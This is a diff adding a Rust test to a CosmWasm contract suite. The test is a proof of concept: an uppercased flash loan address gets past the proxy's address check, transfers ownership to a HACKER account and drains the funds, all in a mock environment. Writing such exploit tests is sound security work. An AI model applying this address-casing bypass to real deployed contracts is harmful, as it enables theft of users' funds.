@@ -3,7 +3,8 @@ pub mod tests {
     use crate::contract::DENOM;
     use crate::ContractError as ProxyContractError;
     use common::flash_loan::{
-        ExecuteMsg as FlashLoanExecuteMsg, InstantiateMsg as FlashLoanInstantiateMsg,
+        Config as FlashLoanConfig, ExecuteMsg as FlashLoanExecuteMsg,
+        InstantiateMsg as FlashLoanInstantiateMsg, QueryMsg as FlashLoanQueryMsg,
     };
     use common::mock_arb::{
         ExecuteMsg as MockArbExecuteMsg, InstantiateMsg as MockArbInstantiateMsg,
@@ -227,5 +228,59 @@ pub mod tests {
             .downcast()
             .unwrap();
         assert!(matches!(err, ProxyContractError::CallToFlashLoan {}));
+    }
+
+    #[test]
+    fn exploit_bad_addresses_input() {
+        let (mut app, proxy_contract, flash_loan_contract, _) = proper_instantiate();
+
+        // EXPLOIT: user can pass in uppercased flash loan address
+        // This will fail the `recipient == flash_loan_addr` check
+        // but will allow the proxy to call the flash loan contract directly
+        let flash_recipient = Addr::unchecked(flash_loan_contract.to_string().to_ascii_uppercase());
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            proxy_contract.clone(),
+            &ExecuteMsg::RequestFlashLoan {
+                recipient: flash_recipient,
+                msg: to_binary(&FlashLoanExecuteMsg::TransferOwner {
+                    new_owner: Addr::unchecked(HACKER),
+                })
+                .unwrap(),
+            },
+            &[],
+        )
+        .unwrap();
+        // Flash loan is now owned by hacker :(
+        let config: FlashLoanConfig = app
+            .wrap()
+            .query_wasm_smart(
+                flash_loan_contract.to_string(),
+                &FlashLoanQueryMsg::Config {},
+            )
+            .unwrap();
+        assert_eq!(config.owner, Addr::unchecked(HACKER));
+        // Can drain funds
+        app.execute_contract(
+            Addr::unchecked(HACKER),
+            flash_loan_contract.clone(),
+            &FlashLoanExecuteMsg::WithdrawFunds {
+                recipient: Addr::unchecked(HACKER),
+            },
+            &[],
+        )
+        .unwrap();
+        // Funds are drained
+        let balance = app
+            .wrap()
+            .query_balance(flash_loan_contract.to_string(), DENOM)
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::zero());
+        // Hacker owns 10_000 tokens
+        let balance = app
+            .wrap()
+            .query_balance(Addr::unchecked(HACKER), DENOM)
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::new(10_000));
     }
 }
